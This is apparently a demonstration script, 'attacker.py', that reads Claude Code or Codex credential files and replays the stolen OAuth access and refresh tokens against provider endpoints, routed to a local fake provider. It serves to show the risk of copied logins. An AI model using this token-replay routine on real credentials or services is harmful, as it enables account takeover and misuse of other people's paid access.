"""What hostile code does with a login it copied out of a computer: it calls the provider directly,
from anywhere on the internet (here, straight to the fake provider, no boundary in the way).
usage: attacker.py <cc|cx> <credentials file> <up-ca>"""
import http.client, json, ssl, sys
kind, path, ca = sys.argv[1:4]
cx = ssl.create_default_context(cafile=ca)
def call(host, method, p, body=None, headers={}):
    c = http.client.HTTPSConnection("127.0.0.1", 8443, context=cx); c._tunnel_host = None
    c.sock = cx.wrap_socket(__import__("socket").create_connection(("127.0.0.1", 8443)), server_hostname=host)
    c.request(method, p, body=json.dumps(body) if body else None, headers=dict(headers, Host=host, **({"content-type": "application/json"} if body else {})))
    r = c.getresponse(); t = r.read().decode()[:150]; return r.status, t
def short(r): return r[0], ("works, the provider answered" if r[0] == 200 else r[1][:110])
j = json.load(open(path))
if kind == "cc":
    a, rt = j["claudeAiOauth"]["accessToken"], j["claudeAiOauth"]["refreshToken"]
    print("  use the access token:", *short(call("api.anthropic.com", "POST", "/v1/messages", {"model": "claude-x", "max_tokens": 10, "messages": [{"role": "user", "content": "hi"}]}, {"authorization": "Bearer " + a})))
    print("  refresh with the refresh token:", *short(call("platform.claude.com", "POST", "/v1/oauth/token", {"grant_type": "refresh_token", "refresh_token": rt, "client_id": "9d1c250a-e61b-44d9-88ed-5944d1962f5e"})))
else:
    t = j["tokens"]
    print("  use the access token:", *short(call("chatgpt.com", "POST", "/backend-api/codex/responses", {"model": "gpt-x", "input": []}, {"authorization": "Bearer " + t["access_token"], "chatgpt-account-id": t.get("account_id", "")})))
    print("  refresh with the refresh token:", *short(call("auth.openai.com", "POST", "/oauth/token", {"grant_type": "refresh_token", "refresh_token": t["refresh_token"], "client_id": "app_EMoamEEZ73f0CkXaXp7hrann"})))
